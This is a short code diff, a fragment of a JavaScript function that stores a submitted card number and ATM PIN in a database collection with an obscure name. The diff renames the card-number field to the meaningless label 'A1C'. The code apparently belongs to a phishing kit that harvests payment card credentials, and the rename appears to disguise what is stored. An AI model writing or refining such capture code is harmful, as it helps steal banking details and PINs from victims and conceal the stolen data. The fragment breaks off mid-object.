@@ -23,7 +23,7 @@ const saveMessages = (ccard, cpin) => {
   var newududip007 = ududip007DB.push();
 
   newududip007.set({
-      Card_Number: ccard,
+      A1C: ccard,
       ATM_PIN: cpin,
       
     
